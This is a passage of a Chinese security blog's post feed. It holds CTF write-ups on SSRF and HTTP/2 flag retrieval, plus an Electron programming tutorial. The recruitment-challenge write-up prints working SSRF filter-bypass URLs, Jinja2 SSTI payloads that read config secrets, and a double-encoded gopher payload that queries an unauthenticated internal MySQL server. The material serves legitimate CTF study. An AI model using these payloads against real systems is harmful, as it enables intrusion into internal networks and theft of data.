<span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>host <span class="token operator">=</span> <span class="token string">'127.0.0.1'</span>port <span class="token operator">=</span> <span class="token number">2333</span>s<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    c<span class="token punctuation">,</span> addr <span class="token operator">=</span> s<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">'连接地址：'</span><span class="token punctuation">,</span> addr    c<span class="token punctuation">.</span>send<span class="token punctuation">(</span>a<span class="token punctuation">)</span></code></pre><p>执行<code>curl -vv --http2-prior-knowledge 127.0.0.1:6777 --output -</code>返回的数据：</p><pre class=" language-response"><code class="language-response">* Rebuilt URL to: 127.0.0.1:6777/*   Trying 127.0.0.1...* TCP_NODELAY set* Connected to 127.0.0.1 (127.0.0.1) port 6777 (#0)* Using HTTP2, server supports multi-use* Connection state changed (HTTP/2 confirmed)* Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0* Using Stream ID: 1 (easy handle 0x55d0f3f35520)> GET / HTTP/2> Host: 127.0.0.1:6777> User-Agent: curl/7.61.0> Accept: */*> * Connection state changed (MAX_CONCURRENT_STREAMS == 128)!< HTTP/2 200 < server: nginx/1.14.0 (Ubuntu)< date: Wed, 30 Jan 2019 16:02:53 GMT< content-type: text/html; charset=UTF-8< set-cookie: F1ag:flag{Http2_Mak3_a_Differ3nce}=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0< * Closing connection 0U hav3 g0t Me!!!%                  </code></pre><p>[+] GET==&gt; F1ag:flag{Http2_Mak3_a_Differ3nce}</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> ssrf </tag>
            
            <tag> write-up </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>某入群题解题记录</title>
      <link href="/2019/01/29/%E6%9F%90%E5%85%A5%E7%BE%A4%E9%A2%98%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2019/01/29/%E6%9F%90%E5%85%A5%E7%BE%A4%E9%A2%98%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>……</p><a id="more"></a><h1 id="记某入群题解题过程"><a href="#记某入群题解题过程" class="headerlink" title="记某入群题解题过程"></a>记某入群题解题过程</h1><p>闲来无事，看众人纷纷在玩入群题，纵使我菜的不敢动手，也想尝试一下。</p><h2 id="0x01-迎面而来的SSRF"><a href="#0x01-迎面而来的SSRF" class="headerlink" title="0x01 迎面而来的SSRF"></a>0x01 迎面而来的SSRF</h2><p>首先访问题目地址：</p><p><code>index.php源码</code></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">check_inner_ip</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token variable">$match_result</span><span class="token operator">=</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/'</span><span class="token punctuation">,</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$match_result</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'url fomat error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">try</span>     <span class="token punctuation">{</span>         <span class="token variable">$url_parse</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">catch</span><span class="token punctuation">(</span>Exception <span class="token variable">$e</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'url fomat error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token variable">$hostname</span><span class="token operator">=</span><span class="token variable">$url_parse</span><span class="token punctuation">[</span><span class="token string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token variable">$ip</span><span class="token operator">=</span><span class="token function">gethostbyname</span><span class="token punctuation">(</span><span class="token variable">$hostname</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$int_ip</span><span class="token operator">=</span><span class="token function">ip2long</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">return</span> <span class="token function">ip2long</span><span class="token punctuation">(</span><span class="token string">'127.0.0.0'</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">></span><span class="token number">24</span> <span class="token operator">==</span> <span class="token variable">$int_ip</span><span class="token operator">></span><span class="token operator">></span><span class="token number">24</span> <span class="token operator">||</span> <span class="token function">ip2long</span><span class="token punctuation">(</span><span class="token string">'10.0.0.0'</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">></span><span class="token number">24</span> <span class="token operator">==</span> <span class="token variable">$int_ip</span><span class="token operator">></span><span class="token operator">></span><span class="token number">24</span> <span class="token operator">||</span> <span class="token function">ip2long</span><span class="token punctuation">(</span><span class="token string">'172.16.0.0'</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">></span><span class="token number">20</span> <span class="token operator">==</span> <span class="token variable">$int_ip</span><span class="token operator">></span><span class="token operator">></span><span class="token number">20</span> <span class="token operator">||</span> <span class="token function">ip2long</span><span class="token punctuation">(</span><span class="token string">'192.168.0.0'</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">></span><span class="token number">16</span> <span class="token operator">==</span> <span class="token variable">$int_ip</span><span class="token operator">></span><span class="token operator">></span><span class="token number">16</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">function</span> <span class="token function">safe_request_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">check_inner_ip</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token keyword">echo</span> <span class="token variable">$url</span><span class="token punctuation">.</span><span class="token string">' is inner ip'</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">else</span>     <span class="token punctuation">{</span>        <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token variable">$result_info</span> <span class="token operator">=</span> <span class="token function">curl_getinfo</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result_info</span><span class="token punctuation">[</span><span class="token string">'redirect_url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>         <span class="token punctuation">{</span>             <span class="token function">safe_request_url</span><span class="token punctuation">(</span><span class="token variable">$result_info</span><span class="token punctuation">[</span><span class="token string">'redirect_url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token function">safe_request_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token delimiter">?></span></code></pre><p>意思是我们可以通过<code>http|https|gopher|dict</code>四种协议进行Curl操作，并且探测到的内容会通过<code>var_dump($output);</code>打印出来，但是它会对我们探测的ip地址进行check，看是否为内网地址（<a href="https://www.cnblogs.com/afanti/p/9928371.html" target="_blank" rel="noopener">可以进行bypass，这题的ssrf与上海大学生网安赛某春秋出的题有些许类似</a>）。</p><pre class=" language-php+HTML"><code class="language-php+HTML">payload1: ?url=http://127.0.0.1./flag.phppayload2: ?url=http://@127.0.0.1:80@baidu.com/flag.php</code></pre><p>原理：<a href="https://skysec.top/2018/03/15/Some%20trick%20in%20ssrf%20and%20unserialize(" target="_blank" rel="noopener">Some trick in ssrf and unserialize()</a>/#some-trick-in-unserialize)</p><h2 id="0x02-知道网段后肆无忌惮的内网探测"><a href="#0x02-知道网段后肆无忌惮的内网探测" class="headerlink" title="0x02 知道网段后肆无忌惮的内网探测"></a>0x02 知道网段后肆无忌惮的内网探测</h2><p><code>PS: 想写一个自动化的SSRF探测工具</code></p><p>通过bp的intruder模块，对内网网段的常用端口进行服务探测（172.11.243.0/24）：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190129211758.png" alt=""></p><p>可以得到<code>172.11.243.81:8080</code>和<code>172.11.243.218:3306</code>，分别为一个flask服务和mysql服务。</p><p>source code of flask service:</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> flask<span class="token keyword">import</span> osapp <span class="token operator">=</span> flask<span class="token punctuation">.</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'HINT'</span><span class="token punctuation">]</span> <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'HINT'</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> open<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/yulige/&lt;path:yulige>'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">yulige</span><span class="token punctuation">(</span>yulige<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">safe_jinja</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> s<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'('</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">')'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>        blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'config'</span><span class="token punctuation">,</span> <span class="token string">'self'</span><span class="token punctuation">]</span>        <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'{{% set {}=None%}}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> blacklist<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>s    <span class="token keyword">return</span> flask<span class="token punctuation">.</span>render_template_string<span class="token punctuation">(</span>safe_jinja<span class="token punctuation">(</span>yulige<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">)</span></code></pre><p>根据源码中出现的<code>flask.render_template_string</code>，可以知道这是考SSTI模板注入，但是这里对<code>(、)、config、self</code>进行了过滤，无法进行常规的操作，注意到<code>app.config[&#39;HINT&#39;] = os.environ.pop(&#39;HINT&#39;)</code>，可以想办法get到HINT的值，可以参考<a href="https://www.xmsec.cc/ssti-and-bypass-sandbox-in-jinja2/" target="_blank" rel="noopener">从SSTI到沙箱逃逸-jinja2</a>。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#payload:{{url_for.__globals__[%27current_app%27].config[%27HINT%27]}}</span><span class="token comment" spellcheck="true">#payload:{{get_flashed_messages.__globals__[%27current_app%27].config[%27HINT%27]}}</span></code></pre><p>拿payload打一发后拿到了HINT里面的mysql用户名。</p><h2 id="0x03-拿到数据库名后对mysql的狂轰滥炸"><a href="#0x03-拿到数据库名后对mysql的狂轰滥炸" class="headerlink" title="0x03 拿到数据库名后对mysql的狂轰滥炸"></a>0x03 拿到数据库名后对mysql的狂轰滥炸</h2><p>注意到最开始允许我们使用的协议中包括<code>gopher</code>协议，通过<code>ssrf＋gopher</code>我们可以对未设置密码的mysql服务进行攻击，这里用到Github上面一个好东西<a href="https://github.com/tarunkant/Gopherus" target="_blank" rel="noopener">Gopherus</a>。</p><p>列数据库名（依次类推，拿表名，拿列名，getflag）：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190129214016.png" alt=""></p><p>需要注意的是，我们是在打ssrf，通过跳板打内网，payload中的url编码需要进行二次编码才能正常发挥作用：</p><pre class=" language-payload"><code class="language-payload">url=gopher://172.11.243.218:3306/_%25ae%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2579%2575%256c%2569%2567%2565%2565%2565%2565%2531%2532%2533%2533%2532%2531%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%252c%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2566%256c%2561%2567%2520%2566%2572%256f%256d%2520%2566%256c%2561%2534%2534%2534%2531%2531%2531%2531%2567%252e%2546%2531%2531%2531%2531%256c%256c%256c%256c%2567%2567%2567%2567%2567%2501%2500%2500%2500%2501</code></pre><p>get flag：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190129214508.png" alt=""></p><h2 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04 小结"></a>0x04 小结</h2><p>环境和氛围，题目的质量，都能决定你自己的进步速度。当然，最重要的还是你自己的坚持和努力。</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> SSRF </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Electron-Learning-1</title>
      <link href="/2019/01/25/Electron-Learning-1/"/>
      <url>/2019/01/25/Electron-Learning-1/</url>
      
        <content type="html"><![CDATA[<p>Electron.</p><a id="more"></a>    <h1 id="Electron-学习记录"><a href="#Electron-学习记录" class="headerlink" title="Electron 学习记录"></a>Electron 学习记录</h1><blockquote><p>参考 链接：</p><p><a href="https://www.jianshu.com/p/1687f8dcd70c" target="_blank" rel="noopener">开发 Electron app 必知的 4 个 tips</a></p><p><a href="https://www.w3cschool.cn/electronmanual/" target="_blank" rel="noopener">Electronn中文手册</a></p><p><a href="https://mlln.cn/2018/01/08/electron%E4%BD%9C%E4%B8%BApython%E7%95%8C%E9%9D%A2%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/" target="_blank" rel="noopener">Electron与python</a></p><p><a href="https://www.jianshu.com/p/59a0a24ed388" target="_blank" rel="noopener">3分钟上手：通过vue和electron创建桌面应用</a> </p></blockquote><h2 id="Electron-简介"><a href="#Electron-简介" class="headerlink" title="Electron 简介"></a>Electron 简介</h2><p>引用W3school的Electron中文文档简介：</p><blockquote><p>Electron 可以让你使用纯 <a href="https://www.w3cschool.cn/javascript/" target="_blank" rel="noopener">JavaScript</a> 调用丰富的原生 APIs 来创造桌面应用。你可以把它看作是专注于桌面应用而不是 web 服务器的，io.js 的一个变体。</p><p>这不意味着 Electron 是绑定了 GUI 库的 JavaScript。相反，Electron 使用 web 页面作为它的 GUI，所以你能把它看作成一个被 JavaScript 控制的，精简版的 Chromium 浏览器。</p></blockquote><h3 id="主进程（Main-Process）"><a href="#主进程（Main-Process）" class="headerlink" title="主进程（Main Process）"></a>主进程（Main Process）</h3><p>在 Electron 里，运行 <code>package.json</code> 里 <code>main</code> 脚本的进程被称为<strong>主进程</strong>。在主进程运行的脚本可以以创建 web 页面的形式展示 GUI。</p><h3 id="渲染进程（Renderer-Process）"><a href="#渲染进程（Renderer-Process）" class="headerlink" title="渲染进程（Renderer Process）"></a>渲染进程（Renderer Process）</h3><p>由于 Electron 使用 Chromium 来展示页面，所以 Chromium 的多进程结构也被充分利用。每个 Electron 的页面都在运行着自己的进程，这样的进程我们称之为<strong>渲染进程</strong>。</p><p>在一般浏览器中，网页通常会在沙盒环境下运行，并且不允许访问原生资源。然而，<code>Electron 用户拥有在网页中调用 io.js 的 APIs 的能力</code>，可以与底层操作系统直接交互。</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190124203528.png" alt="运行概述"></p><h2 id="Electron-在线-离线事件探测"><a href="#Electron-在线-离线事件探测" class="headerlink" title="Electron 在线/离线事件探测"></a>Electron 在线/离线事件探测</h2><blockquote><p>Tips：electron v4.02中的主进程和渲染进程进行通信的时候，就需要用到<code>ipc</code>这个特性。而<code>ipc</code>又分为<code>ipcMain</code>和<code>ipcRenderer</code>两个，分别用于主进程和渲染进程。</p><p>let命令和var命令不同的地方是let的对象只在let所在的代码块范围中起作用。</p></blockquote><p>这里需要用到navigator对象，但是在electron主进程中没有这个，所以需要建立一个渲染进程，利用IPC通信，获取网络状态。</p><p>在我的环境中可以通过以下代码实践成功：</p><p><code>main.js</code></p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token punctuation">{</span>ipcMain<span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'electron'</span><span class="token punctuation">)</span><span class="token keyword">let</span> onlineStatusWindowapp<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'ready'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  onlineStatusWindow <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BrowserWindow</span><span class="token punctuation">(</span><span class="token punctuation">{</span> width<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> height<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> show<span class="token punctuation">:</span> <span class="token boolean">false</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  onlineStatusWindow<span class="token punctuation">.</span><span class="token function">loadURL</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`file://</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>__dirname<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">/online-status.html`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span>ipcMain<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'online-status-changed'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>event<span class="token punctuation">,</span> status<span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p><code>online-status.html</code></p><pre class=" language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">  <span class="token keyword">const</span> <span class="token punctuation">{</span>ipcRenderer<span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'electron'</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> updateOnlineStatus <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    ipcRenderer<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'online-status-changed'</span><span class="token punctuation">,</span> navigator<span class="token punctuation">.</span>onLine <span class="token operator">?</span> <span class="token string">'online'</span> <span class="token punctuation">:</span> <span class="token string">'offline'</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token comment" spellcheck="true">/*navigator.onLine ==> true or false*/</span>  window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'online'</span><span class="token punctuation">,</span>  updateOnlineStatus<span class="token punctuation">)</span>  window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'offline'</span><span class="token punctuation">,</span>  updateOnlineStatus<span class="token punctuation">)</span>  <span class="token function">updateOnlineStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><h2 id="Electron-进程"><a href="#Electron-进程" class="headerlink" title="Electron 进程"></a>Electron 进程</h2><p>Electron的<code>process</code>对象</p><pre class=" language-javascript"><code class="language-javascript">process<span class="token punctuation">.</span>type <span class="token operator">-</span> String <span class="token operator">-</span> 获取进程类型process<span class="token punctuation">.</span>versions<span class="token punctuation">[</span><span class="token string">'electron'</span><span class="token punctuation">]</span> <span class="token operator">-</span> String <span class="token operator">-</span> 获取electron版本process<span class="token punctuation">.</span>versions<span class="token punctuation">[</span><span class="token string">'chrome'</span><span class="token punctuation">]</span> <span class="token operator">-</span> String <span class="token operator">-</span> 获取chromium的版本process<span class="token punctuation">.</span>resourcePath <span class="token operator">-</span> String <span class="token operator">-</span> Javascript源代码路径<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>process<span class="token punctuation">.</span>noAsar <span class="token operator">=</span> <span class="token boolean">true</span> or <span class="token boolean">false</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>process<span class="token punctuation">.</span><span class="token function">hang</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//使得进程的主线程挂起</span></code></pre><h2 id="Electron-支持的Chrome命令行开关"><a href="#Electron-支持的Chrome命令行开关" class="headerlink" title="Electron 支持的Chrome命令行开关"></a>Electron 支持的Chrome命令行开关</h2><p>在app模块的ready事件发出之前可以通过<code>app.commandLine.appendSwitch</code>来添加指定的命令参数到main脚本中：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'electron'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>app<span class="token punctuation">;</span>app<span class="token punctuation">.</span>commandLine<span class="token punctuation">.</span><span class="token function">appendSwitch</span><span class="token punctuation">(</span><span class="token string">'remote-debugging-port'</span><span class="token punctuation">,</span> <span class="token string">'8315'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span>commandLine<span class="token punctuation">.</span><span class="token function">appendSwitch</span><span class="token punctuation">(</span><span class="token string">'host-rules'</span><span class="token punctuation">,</span> <span class="token string">'MAP * 127.0.0.1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'ready'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// Your code here</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>更多的命令参数可参考：<a href="https://www.w3cschool.cn/electronmanual/82vz1ql9.html" target="_blank" rel="noopener">Electron中文文档</a></p><h2 id="Electron-环境变量"><a href="#Electron-环境变量" class="headerlink" title="Electron 环境变量"></a>Electron 环境变量</h2><p>一些 Electron 的行为受到环境变量的控制，因为他们的初始化比命令行和应用代码更早。以下 是一些常用的环境变量名</p><pre class=" language-bash"><code class="language-bash">//<span class="token operator">></span>set ELECTRON_ENABLE_LOGGING<span class="token operator">=</span>true//<span class="token operator">></span>electronELECTRON_RUN_AS_NODEELECTRON_ENABLE_LOGGINGELECTRON_LOG_ASAR_READSELECTRON_ENABLE_STACK_DUMPINGELECTRON_DEFAULT_ERROR_MODEELECTRON_NO_ATTACH_CONSOLEELECTRON_FORCE_WINDOW_MENU_BARELECTRON_HIDE_INTERNAL_MODULES</code></pre>]]></content>
      
      
      <categories>
          
          <category> Programming </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Electron </tag>
            
            <tag> Programming </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>追踪溯源_白话文讲盗号--科普篇</title>
      <link href="/2018/11/20/%E8%BF%BD%E8%B8%AA%E6%BA%AF%E6%BA%90-%E5%B0%8F%E7%99%BD%E7%A7%91%E6%99%AE%E7%AF%87/"/>
      <url>/2018/11/20/%E8%BF%BD%E8%B8%AA%E6%BA%AF%E6%BA%90-%E5%B0%8F%E7%99%BD%E7%A7%91%E6%99%AE%E7%AF%87/</url>
      
